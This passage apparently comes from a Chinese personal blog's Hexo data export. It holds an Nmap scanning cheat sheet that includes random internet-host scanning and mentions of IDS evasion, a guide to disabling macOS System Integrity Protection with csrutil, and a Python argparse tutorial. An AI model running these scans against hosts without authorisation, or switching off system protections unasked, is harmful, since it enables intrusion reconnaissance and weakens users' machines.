Nmap</a></p>\n<p><a href=\"http://www.freebuf.com/articles/network/32302.html\" target=\"_blank\" rel=\"external\">Nmap从探测到漏洞利用备忘录 – Nmap简介(一)</a></p>\n<h2 id=\"零散知识\"><a href=\"#零散知识\" class=\"headerlink\" title=\"#\b零散\b\b知识\"></a>#\b零散\b\b知识</h2><h4 id=\"Nmap脚本引擎-NSE\"><a href=\"#Nmap脚本引擎-NSE\" class=\"headerlink\" title=\"Nmap脚本引擎(NSE)\"></a>Nmap脚本引擎(NSE)</h4><pre><code>- 网络探测\n- 漏洞检测\n- 漏洞利用\n</code></pre><h4 id=\"端口状态说明\"><a href=\"#端口状态说明\" class=\"headerlink\" title=\"端口状态说明\"></a>端口状态说明</h4><ul>\n<li><p>Open(开放的): 应用程序正在这个端口上监听连接。</p>\n</li>\n<li><p>Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>\n</li>\n<li><p>Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>\n</li>\n<li><p>Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>\n</li>\n<li><p>Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>\n</li>\n<li><p>Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p><a href=\"http://www.91ri.org/8654.html\">http://www.91ri.org/8654.html</a></p>\n<h2 id=\"Nmap-介绍\"><a href=\"#Nmap-介绍\" class=\"headerlink\" title=\"Nmap 介绍\"></a>Nmap 介绍</h2><p><img src=\"http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG\" alt=\"功能架构图\"></p>\n<h3 id=\"四项基本功能\"><a href=\"#四项基本功能\" class=\"headerlink\" title=\"四项基本功能\"></a>四项基本功能</h3>","more":"<ul>\n<li><p>主机发现（Host Discovery）</p>\n</li>\n<li><p>端口扫描（Port Scanning）</p>\n</li>\n<li><p>版本侦测（Version Detection）</p>\n</li>\n<li><p>操作系统侦测（Operating System Detection）</p>\n<p>  而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。</p>\n</li>\n</ul>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    <span class=\"comment\"># 多主机地址扫描</span></div><div class=\"line\">nmap -A -T4 host        </div><div class=\"line\"><span class=\"comment\"># -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)</span></div><div class=\"line\"><span class=\"comment\"># -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。</span></div></pre></td></tr></table></figure>\n<h2 id=\"常规使用\"><a href=\"#常规使用\" class=\"headerlink\" title=\"\b常规使用\"></a>\b常规使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap IP/Hostname                    <span class=\"comment\"># 最基本的使用情况</span></div><div class=\"line\">nmap host1 host2 host3 etc...       <span class=\"comment\"># 扫描多主机</span></div><div class=\"line\">nmap 192.168.0.1-192.168.1.254      <span class=\"comment\"># 扫描IP地址段</span></div><div class=\"line\">nmap 192.168.0.1/23                 <span class=\"comment\"># CIDR格式的网络地址段（与上一条命令等同）</span></div><div class=\"line\">nmap -iL list.txt                   <span class=\"comment\"># \b扫描目标主机列表</span></div><div class=\"line\">nmap -Pn host                       <span class=\"comment\"># \b假定目标存活</span></div></pre></td></tr></table></figure>\n<h2 id=\"高级使用\"><a href=\"#高级使用\" class=\"headerlink\" title=\"高级使用\"></a>高级使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap -A host                        <span class=\"comment\"># ？？？？？？？</span></div></pre></td></tr></table></figure>\n<h2 id=\"—\"><a href=\"#—\" class=\"headerlink\" title=\"—\"></a>—</h2><hr>\n<h2 id=\"渗透测试中不常用-我反正没用过\"><a href=\"#渗透测试中不常用-我反正没用过\" class=\"headerlink\" title=\"渗透测试中不常用(我反正没用过)\"></a>渗透测试中不常用(我反正没用过)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap 192.168.1.0/24 --exclude 192.168.1.11  <span class=\"comment\"># 排除一些主机</span></div><div class=\"line\">nmap -iR 100                        <span class=\"comment\"># \b随机扫描互联网上100个主机</span></div><div class=\"line\">nmap -Sp                            <span class=\"comment\"># 只ping扫描，</span></div><div class=\"line\">nmap -PS                            <span class=\"comment\"># TCP SYN scan (TCP SYN ping)</span></div><div class=\"line\">nmap -PA                            <span class=\"comment\"># TCP ACK scan ping</span></div><div class=\"line\">nmap -PU                            <span class=\"comment\"># UDP scan  ping</span></div><div class=\"line\">nmap -PY                            <span class=\"comment\"># ??? SCTP scan\b ping</span></div><div class=\"line\">nmap -PE/PP/PM                      <span class=\"comment\"># ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？</span></div><div class=\"line\">nmap -PO [protocol] host            <span class=\"comment\"># 指定协议ping</span></div><div class=\"line\">nmap -PR                            <span class=\"comment\"># ??? ARP ping </span></div><div class=\"line\">nmap --traceroute                   <span class=\"comment\"># traceroute 功能 探测网络路径</span></div><div class=\"line\">nmap -n/-R                          <span class=\"comment\"># Never do DNS resolution/Always resolve [default: sometimes]</span></div><div class=\"line\">nmap --dns-servers serv1,serv2,,,   <span class=\"comment\"># 指定DNS</span></div><div class=\"line\">nmap --system-dns                   <span class=\"comment\"># 使用系统DNS</span></div><div class=\"line\">nmap <span class=\"_\">-s</span>L IPs                        <span class=\"comment\"># 列出IPs\b的反向DNS结果</span></div><div class=\"line\">nmap</div></pre></td></tr></table></figure>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://resources.infosecinstitute.com/nmap-cheat-sheet/\">Introduction to Nmap</a></p>\n<p><a href=\"http://www.freebuf.com/articles/network/32302.html\">Nmap从探测到漏洞利用备忘录 – Nmap简介(一)</a></p>\n<h2 id=\"零散知识\"><a href=\"#零散知识\" class=\"headerlink\" title=\"#\b零散\b\b知识\"></a>#\b零散\b\b知识</h2><h4 id=\"Nmap脚本引擎-NSE\"><a href=\"#Nmap脚本引擎-NSE\" class=\"headerlink\" title=\"Nmap脚本引擎(NSE)\"></a>Nmap脚本引擎(NSE)</h4><pre><code>- 网络探测\n- 漏洞检测\n- 漏洞利用\n</code></pre><h4 id=\"端口状态说明\"><a href=\"#端口状态说明\" class=\"headerlink\" title=\"端口状态说明\"></a>端口状态说明</h4><ul>\n<li><p>Open(开放的): 应用程序正在这个端口上监听连接。</p>\n</li>\n<li><p>Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>\n</li>\n<li><p>Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>\n</li>\n<li><p>Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>\n</li>\n<li><p>Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>\n</li>\n<li><p>Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>\n</li>\n</ul>"},{"title":"MacOS - SIP (System Integrity Protection) 系统集成保护","date":"2017-04-26T11:19:03.000Z","_content":"# Mac - SIP 系统集成保护\n官方资料[About System Integrity Protection on your Mac](https://support.apple.com/en-us/HT204899)\n\n## 开启/关闭SIP\n参考来源 [http://www.jianshu.com/p/0572336a0771](http://www.jianshu.com/p/0572336a0771)\n### 1.进入Recovery Mode\n开机按住command+R\n\n### 2.使用csrutil命令\n<!-- more -->\n打开终端Terminal，键入csrutil可以显示该命令的使用方法\n```bash\n➜  ~ csrutil\nusage: csrutil <command>\nModify the System Integrity Protection configuration. All configuration changes apply to the entire machine.\nAvailable commands:\n\n    clear\n        Clear the existing configuration. Only available in Recovery OS.\n    disable\n        Disable the protection on the machine. Only available in Recovery OS.\n    enable\n        Enable the protection on the machine. Only available in Recovery OS.\n    status\n        Display the current configuration.\n\n    netboot\n        add <address>\n            Insert a new IPv4 address in the list of allowed NetBoot sources.\n        list\n            Print the list of allowed NetBoot sources.\n        remove <address>\n            Remove an IPv4 address from the list of allowed NetBoot sources.\n```\n正常系统模式下仅可以用status命令查询SIP状态\n\n### 3.常用参数\nclear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)\n\ndisable：关闭SIP(仅在恢复模式下有效)\n\nenable：开启SIP(仅在恢复模式下有效)\n\nstatus：查询SIP状态\n\n### 4.常用参数进阶\n\n除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下\n```bash\ncsrutil enable [--without kext|fs|debug|dtrace|nvram] [--no-internal]\n# 单项使用：\nsudo csrutil enable –without fs：Filesystem Protections disable\nsudo csrutil enable –without kext：Kext Signing disable\nsudo csrutil enable –without debug：Debugging Restrictions disable\nsudo csrutil enable –without nvram：NVRAM Protections disable\nsudo csrutil enable –without dtrace：DTrace Restrictions disable\n# 组合使用：\nsudo csrutil enable –without kext –without fs：Filesystem Protections and Kext Signing are disabled\n```\n\n## mac下使用proxychains-ng实现代理\n由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。","source":"_posts/Mac-SIP.md","raw":"---\ntitle: MacOS - SIP (System Integrity Protection) 系统集成保护\ndate: 2017-04-26 19:19:03\ntags: \n---\n# Mac - SIP 系统集成保护\n官方资料[About System Integrity Protection on your Mac](https://support.apple.com/en-us/HT204899)\n\n## 开启/关闭SIP\n参考来源 [http://www.jianshu.com/p/0572336a0771](http://www.jianshu.com/p/0572336a0771)\n### 1.进入Recovery Mode\n开机按住command+R\n\n### 2.使用csrutil命令\n<!-- more -->\n打开终端Terminal，键入csrutil可以显示该命令的使用方法\n```bash\n➜  ~ csrutil\nusage: csrutil <command>\nModify the System Integrity Protection configuration. All configuration changes apply to the entire machine.\nAvailable commands:\n\n    clear\n        Clear the existing configuration. Only available in Recovery OS.\n    disable\n        Disable the protection on the machine. Only available in Recovery OS.\n    enable\n        Enable the protection on the machine. Only available in Recovery OS.\n    status\n        Display the current configuration.\n\n    netboot\n        add <address>\n            Insert a new IPv4 address in the list of allowed NetBoot sources.\n        list\n            Print the list of allowed NetBoot sources.\n        remove <address>\n            Remove an IPv4 address from the list of allowed NetBoot sources.\n```\n正常系统模式下仅可以用status命令查询SIP状态\n\n### 3.常用参数\nclear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)\n\ndisable：关闭SIP(仅在恢复模式下有效)\n\nenable：开启SIP(仅在恢复模式下有效)\n\nstatus：查询SIP状态\n\n### 4.常用参数进阶\n\n除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下\n```bash\ncsrutil enable [--without kext|fs|debug|dtrace|nvram] [--no-internal]\n# 单项使用：\nsudo csrutil enable –without fs：Filesystem Protections disable\nsudo csrutil enable –without kext：Kext Signing disable\nsudo csrutil enable –without debug：Debugging Restrictions disable\nsudo csrutil enable –without nvram：NVRAM Protections disable\nsudo csrutil enable –without dtrace：DTrace Restrictions disable\n# 组合使用：\nsudo csrutil enable –without kext –without fs：Filesystem Protections and Kext Signing are disabled\n```\n\n## mac下使用proxychains-ng实现代理\n由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。","slug":"Mac-SIP","published":1,"updated":"2017-06-08T13:04:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hsi0005vquvk0d2fj33","content":"<h1 id=\"Mac-SIP-系统集成保护\"><a href=\"#Mac-SIP-系统集成保护\" class=\"headerlink\" title=\"Mac - SIP 系统集成保护\"></a>Mac - SIP 系统集成保护</h1><p>官方资料<a href=\"https://support.apple.com/en-us/HT204899\" target=\"_blank\" rel=\"external\">About System Integrity Protection on your Mac</a></p>\n<h2 id=\"开启-关闭SIP\"><a href=\"#开启-关闭SIP\" class=\"headerlink\" title=\"开启/关闭SIP\"></a>开启/关闭SIP</h2><p>参考来源 <a href=\"http://www.jianshu.com/p/0572336a0771\" target=\"_blank\" rel=\"external\">http://www.jianshu.com/p/0572336a0771</a></p>\n<h3 id=\"1-进入Recovery-Mode\"><a href=\"#1-进入Recovery-Mode\" class=\"headerlink\" title=\"1.进入Recovery Mode\"></a>1.进入Recovery Mode</h3><p>开机按住command+R</p>\n<h3 id=\"2-使用csrutil命令\"><a href=\"#2-使用csrutil命令\" class=\"headerlink\" title=\"2.使用csrutil命令\"></a>2.使用csrutil命令</h3><a id=\"more\"></a>\n<p>打开终端Terminal，键入csrutil可以显示该命令的使用方法<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  ~ csrutil</div><div class=\"line\">usage: csrutil &lt;<span class=\"built_in\">command</span>&gt;</div><div class=\"line\">Modify the System Integrity Protection configuration. All configuration changes apply to the entire machine.</div><div class=\"line\">Available commands:</div><div class=\"line\"></div><div class=\"line\">    clear</div><div class=\"line\">        Clear the existing configuration. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">disable</span></div><div class=\"line\">        Disable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">enable</span></div><div class=\"line\">        Enable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    status</div><div class=\"line\">        Display the current configuration.</div><div class=\"line\"></div><div class=\"line\">    netboot</div><div class=\"line\">        add &lt;address&gt;</div><div class=\"line\">            Insert a new IPv4 address <span class=\"keyword\">in</span> the list of allowed NetBoot sources.</div><div class=\"line\">        list</div><div class=\"line\">            Print the list of allowed NetBoot sources.</div><div class=\"line\">        remove &lt;address&gt;</div><div class=\"line\">            Remove an IPv4 address from the list of allowed NetBoot sources.</div></pre></td></tr></table></figure></p>\n<p>正常系统模式下仅可以用status命令查询SIP状态</p>\n<h3 id=\"3-常用参数\"><a href=\"#3-常用参数\" class=\"headerlink\" title=\"3.常用参数\"></a>3.常用参数</h3><p>clear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)</p>\n<p>disable：关闭SIP(仅在恢复模式下有效)</p>\n<p>enable：开启SIP(仅在恢复模式下有效)</p>\n<p>status：查询SIP状态</p>\n<h3 id=\"4-常用参数进阶\"><a href=\"#4-常用参数进阶\" class=\"headerlink\" title=\"4.常用参数进阶\"></a>4.常用参数进阶</h3><p>除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">csrutil <span class=\"built_in\">enable</span> [--without kext|fs|debug|dtrace|nvram] [--no-internal]</div><div class=\"line\"><span class=\"comment\"># 单项使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without fs：Filesystem Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext：Kext Signing <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without debug：Debugging Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without nvram：NVRAM Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without dtrace：DTrace Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\"><span class=\"comment\"># 组合使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext –without fs：Filesystem Protections and Kext Signing are disabled</div></pre></td></tr></table></figure></p>\n<h2 id=\"mac下使用proxychains-ng实现代理\"><a href=\"#mac下使用proxychains-ng实现代理\" class=\"headerlink\" title=\"mac下使用proxychains-ng实现代理\"></a>mac下使用proxychains-ng实现代理</h2><p>由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"Mac-SIP-系统集成保护\"><a href=\"#Mac-SIP-系统集成保护\" class=\"headerlink\" title=\"Mac - SIP 系统集成保护\"></a>Mac - SIP 系统集成保护</h1><p>官方资料<a href=\"https://support.apple.com/en-us/HT204899\">About System Integrity Protection on your Mac</a></p>\n<h2 id=\"开启-关闭SIP\"><a href=\"#开启-关闭SIP\" class=\"headerlink\" title=\"开启/关闭SIP\"></a>开启/关闭SIP</h2><p>参考来源 <a href=\"http://www.jianshu.com/p/0572336a0771\">http://www.jianshu.com/p/0572336a0771</a></p>\n<h3 id=\"1-进入Recovery-Mode\"><a href=\"#1-进入Recovery-Mode\" class=\"headerlink\" title=\"1.进入Recovery Mode\"></a>1.进入Recovery Mode</h3><p>开机按住command+R</p>\n<h3 id=\"2-使用csrutil命令\"><a href=\"#2-使用csrutil命令\" class=\"headerlink\" title=\"2.使用csrutil命令\"></a>2.使用csrutil命令</h3>","more":"<p>打开终端Terminal，键入csrutil可以显示该命令的使用方法<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  ~ csrutil</div><div class=\"line\">usage: csrutil &lt;<span class=\"built_in\">command</span>&gt;</div><div class=\"line\">Modify the System Integrity Protection configuration. All configuration changes apply to the entire machine.</div><div class=\"line\">Available commands:</div><div class=\"line\"></div><div class=\"line\">    clear</div><div class=\"line\">        Clear the existing configuration. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">disable</span></div><div class=\"line\">        Disable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">enable</span></div><div class=\"line\">        Enable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    status</div><div class=\"line\">        Display the current configuration.</div><div class=\"line\"></div><div class=\"line\">    netboot</div><div class=\"line\">        add &lt;address&gt;</div><div class=\"line\">            Insert a new IPv4 address <span class=\"keyword\">in</span> the list of allowed NetBoot sources.</div><div class=\"line\">        list</div><div class=\"line\">            Print the list of allowed NetBoot sources.</div><div class=\"line\">        remove &lt;address&gt;</div><div class=\"line\">            Remove an IPv4 address from the list of allowed NetBoot sources.</div></pre></td></tr></table></figure></p>\n<p>正常系统模式下仅可以用status命令查询SIP状态</p>\n<h3 id=\"3-常用参数\"><a href=\"#3-常用参数\" class=\"headerlink\" title=\"3.常用参数\"></a>3.常用参数</h3><p>clear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)</p>\n<p>disable：关闭SIP(仅在恢复模式下有效)</p>\n<p>enable：开启SIP(仅在恢复模式下有效)</p>\n<p>status：查询SIP状态</p>\n<h3 id=\"4-常用参数进阶\"><a href=\"#4-常用参数进阶\" class=\"headerlink\" title=\"4.常用参数进阶\"></a>4.常用参数进阶</h3><p>除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">csrutil <span class=\"built_in\">enable</span> [--without kext|fs|debug|dtrace|nvram] [--no-internal]</div><div class=\"line\"><span class=\"comment\"># 单项使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without fs：Filesystem Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext：Kext Signing <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without debug：Debugging Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without nvram：NVRAM Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without dtrace：DTrace Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\"><span class=\"comment\"># 组合使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext –without fs：Filesystem Protections and Kext Signing are disabled</div></pre></td></tr></table></figure></p>\n<h2 id=\"mac下使用proxychains-ng实现代理\"><a href=\"#mac下使用proxychains-ng实现代理\" class=\"headerlink\" title=\"mac下使用proxychains-ng实现代理\"></a>mac下使用proxychains-ng实现代理</h2><p>由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。</p>"},{"title":"Python argparse模块详解","date":"2017-06-08T02:27:24.000Z","_content":">    argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。\n>    官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。   \n>    https://docs.python.org/3/library/argparse.html\n\n## 使用步骤\n```\nimport argparse                     # 导入模板\n\nparser = argparse.ArgumentParser()  # 创建parser\n\nparser.add_argument()               # 添加参数\n\nargs = parser.parse_args()          # 参数解析\n```\n<!-- more -->\n## [ArgumentParser对象](https://docs.python.org/3/library/argparse.html#argumentparser-objects)\n    class argparse.ArgumentParser(\n        prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n        usage=None,                 # 替换默认的Usage信息\n        description=None,           # 程序简要信息说明(参数说明前)\n        epilog=None,                # 附加信息说明(参数说明后)\n        parents=[],                 # 继承父解析器(parser)\n        formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n        prefix_chars='-',           # 参数前缀符号(默认为-,如：-h/--help)\n        fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n        argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n        conflict_handler='error',   # 参数冲突处理\n        add_help=True,              # 帮助信息中默认添加\"-h, --help\"描述\n        allow_abbrev=True           # 允许参数缩写\n    )\n\n## [add_argument()方法](https://docs.python.org/3/library/argparse.html#the-add-argument-method)\n    ArgumentParser.add_argument(\n        name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n        [, action]      # 采取的基本操作\n                            store(默认)         存储参数值\n                            store_const        使用该字符串选项时，取用const值\n                            store_true         使用该字符串选项时，参数值置为True\n                            store_false        使用该字符串选项时，参数值置为False\n                            append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                            append_const       将多个字符串选项的const值合并到一个list\n                            count              统计选项出现的次数 （如：\"-vvv\",则最终值为3）\n                            help               parser默认会添加一个help action。(一般不用理会)\n                            version            打印版本信息\n                            也可以自定义action类\n        [, nargs]       # 该参数值要求的数量\n                            数值       指明参数个数\n                            ?         提供了参数则取参数值；\n                                        无参数但声明了选项字符串则取const值；\n                                        无参数也未声明选择字符串则取default值\n                            *         所有参数存入list\n                            +         与*类似，但参数个数不能为空\n                            argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n        [, const]       # action/nargs部分要求的常值\n                            1、当action=\"store_const\"或者\"append_const\"时需要设置\n                            2、当选项为(-f/--foo),nargs='?'，同时未提供具体参数时，取用该值。\n        [, default]     # 参数默认值\n        [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n        [, choices]     # 允许的参数值（白名单）,tuple/range\n        [, required]    # 选项是否必须，设置为True表示选项必填。\n        [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n        [, metavar]     # 定义参数在Usage信息中的名称\n        [, dest]        # 解析后的属性名称\n    )\n- ### [自定义action](https://docs.python.org/3/library/argparse.html#action-classes)\n\n    class argparse.**Action**(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)\n\n## [parse_args()方法](https://docs.python.org/3/library/argparse.html#the-parse-args-method)\n    ArgumentParser.parse_args(args=None, namespace=None)\n一般情况下，我们直接使用如下命令就可以了：\n```python\n# args=None, 程序将sys.argv作为参数代入\nargs = parse.parse_args()              \n\n# 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。\nargs = parser.parse_args(['1', '2', '3', '4'])\n\n# namespace=custom_class，将属性分配到一个已经存在的对象中。\nparser.parse_args(args=['--foo', 'BAR'], namespace=custom_class99)\n```\n\n## [其它工具](https://docs.python.org/3/library/argparse.html#other-utilities)\n\n- ### [子命令](https://docs.python.org/3/library/argparse.html#sub-commands)\n    很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。\n\n    ArgumentParser.**add_subparsers**([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> subparsers = parser.add_subparsers(dest='subparser_name')\n    >>> subparser1 = subparsers.add_parser('1')\n    >>> subparser1.add_argument('-x')\n    >>> subparser2 = subparsers.add_parser('2')\n    >>> subparser2.add_argument('y')\n    >>> parser.parse_args(['2', 'frobble'])\n    Namespace(subparser_name='2', y='frobble')\n\n    ```\n\n\n- ### [文件类型对象](https://docs.python.org/3/library/argparse.html#filetype-objects)\n    add_argument()中的FileType的参数\"工厂\"。\n\n    class argparse.**FileType**(mode='r', bufsize=-1, encoding=None, errors=None)\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--raw', type=argparse.FileType('wb', 0))\n    >>> parser.add_argument('out', type=argparse.FileType('w', encoding='UTF-8'))\n    >>> parser.parse_args(['--raw', 'raw.dat', 'file.txt'])\n    Namespace(out=<_io.TextIOWrapper name='file.txt' mode='w' encoding='UTF-8'>, raw=<_io.FileIO name='raw.dat' mode='wb'>)\n\n    ```\n\n- ### [参数分组](https://docs.python.org/3/library/argparse.html#argument-groups)\n    在Usage信息中的参数分组，如pip -h可以看到\"Commands\",\"General Options\"分组。\n\n    ArgumentParser.**add_argument_group**(title=None, description=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='testPROG', add_help=False)\n    >>> group1 = parser.add_argument_group('group1', 'group1 description')\n    >>> group1.add_argument('foo', help='foo help')\n    >>> group2 = parser.add_argument_group('group2', 'group2 description')\n    >>> group2.add_argument('--bar', help='bar help')\n    \n    >>> parser.print_help()\n    \n    usage: testPROG [--bar BAR] foo\n\n    group1:\n    group1 description\n\n    foo    foo help\n\n    group2:\n    group2 description\n\n    --bar BAR  bar help\n    ```\n\n- ### [互斥](https://docs.python.org/3/library/argparse.html#mutual-exclusion)\n    参数互斥！\n\n    ArgumentParser.**add_mutually_exclusive_group**(required=False)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='PROG')\n    >>> group = parser.add_mutually_exclusive_group(required=True)\n    >>> group.add_argument('--foo', action='store_true')\n    >>> group.add_argument('--bar', action='store_false')\n    >>> parser.parse_args([])\n    usage: PROG [-h] (--foo | --bar)\n    PROG: error: one of the arguments --foo --bar is required\n    ```\n\n- ### [解析器默认配置](https://docs.python.org/3/library/argparse.html#parser-defaults)\n    